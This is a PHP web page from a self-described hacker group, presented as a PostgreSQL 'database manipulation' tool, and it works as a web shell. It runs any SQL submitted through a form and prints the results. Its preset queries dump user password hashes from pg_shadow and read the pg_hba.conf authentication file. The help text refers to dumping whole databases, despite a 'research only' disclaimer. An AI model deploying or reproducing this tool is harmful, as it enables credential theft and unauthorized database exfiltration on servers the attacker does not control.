<!--此程序纯属科研！不得用于非法用途，滥用者后果自付！-->
<!--开源小程序，请保留版权 Author:YoCo Smart-->
<!--愚人节版 - Silic Group Hacker Army-->
<html style="background:#f7f7f7;">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PostgreSQL数据库操纵 - YoCo Smart - Silic Group Hacker Army - BlackBap.Org</title>
<script language="javascript">
function pgFull(i){
Str = new Array(6);
Str[0] = "select version();";
Str[1] = "select datname from pg_database;";
Str[2] = "select table_name from information_schema.columns limit 1 offset n;";
Str[3] = "select column_name from information_schema.columns where table_name='xxx' limit 1 offset n;";
Str[4] = "select usename,passwd from pg_shadow;";
Str[5] = "select pg_file_read('pg_hba.conf',1,pg_file_length('pg_hb.conf'));";
pgform.pgsql.value = Str[i];
return true;
}
</script>
</head>
<body>
<center>
<?php
/*****数据库配置变量*****/
$pghost=$_POST['pghost'] ? $_POST['pghost']:'';
$pgport=$_POST['pgport'] ? $_POST['pgport']:'';
$pguser=$_POST['pguser'] ? $_POST['pguser']:'postgres';
$pgpass=$_POST['pgpass'] ? $_POST['pgpass']:'';
$pgdb=$_POST['pgdb'] ? $_POST['pgdb']:'postgres';
$pgquery=$_POST['pgsql'] ? $_POST['pgsql']:'select version()'; 
$pgquery=stripslashes($pgquery);
print<<<END
<!--SQL表单开始-->
<p style="font-size:10pt;font-family:Lucida Handwriting,Times New Roman;">
服务器和端口为选填，数据库无法连接时可尝试不填写<br>
本脚本默认配备的SQL语句适用于PostgreSQL 8.1<br>
脱库请填写正确的数据库名<br>
列表段可用select relname from pg_stat_user_tables limit 1 offset n;<br>
更多过于PostgreSQL语句可参见<a href="http://nana.blackbap.org/?p=archive&id=55" target="_blank">[这里]</a><br>
<br></p>
<form name="pgform" method="POST" action="?">
服务器:<input type="text" name="pghost" value="{$pghost}" style="width:100px">
用户:<input type="text" name="pguser" value="{$pguser}" style="width:100px">
密码:<input tyoe="text" name="pgpass" value="{$pgpass}" style="width:100px">
数据库名:<input type="text" name="pgdb" value="{$pgdb}" style="width:100px"><br><br>
<textarea name="pgsql" style="width:600px;height:200px;">{$pgquery}</textarea><br>
端口：<input type="text" name="pgport" value="{$pgport}" style="width:50px">
<select onchange="return pgFull(options[selectedIndex].value)">
<option value="0" selected>显示版本</option>
<option value="1">数据库</option>
<option value="2">表段</option>
<option value="3">字段</option>
<option value="4">hashes</option>
<option value="5">pg_hb.conf</option>
</select>
<input type="hidden" name="sql" value="YoCo Smart">
<input type="submit" value="执行SQL语句">
<font style="font-size:10pt;">&nbsp;&nbsp;<a href="http://blackbap.org" target="_blank">Silic Group Hacker Army</a>&copy;2009-2012</font></form>
<!--SQL表单结束-->
END;
if(!empty($pghost) && !empty($pgport)){
$conn="host=".$pghost." port=".$pgport." dbname=".$pgdb." user=".$pguser." password=".$pgpass;
}else{
$conn="dbname=".$pgdb." user=".$pguser." password=".$pgpass;
}
if(!empty($_POST['sql'])){
$pgconn = pg_connect($conn) 
or die('悲剧，连不上。错误信息:'.pg_last_error());
$pgresult=pg_query($pgquery) or die('SQL执行发生错误:<br>'.pg_last_error()); 
$pgrow=pg_fetch_row($pgresult);
echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">'."\n<tr>\n";
for ($i=0; $i< pg_num_fields($pgresult); $i++)
{echo '<td bgcolor="#293F5F"><b>'.pg_field_name($pgresult, $i)."</b></td>\n";}
echo "</tr>\n";
pg_result_seek($pgresult, 0);
while ($pgrow=pg_fetch_row($pgresult))
{
echo "<tr>\n";
for ($i=0; $i<pg_num_fields($pgresult); $i++ )
{echo '<td bgcolor="#FFFFE0">'."$pgrow[$i]".'</td>';}
echo "</tr>\n";
}
echo "</table>\n"."</font>";
pg_free_result($pgresult);
pg_close();
}
?>
</center>
</body></html>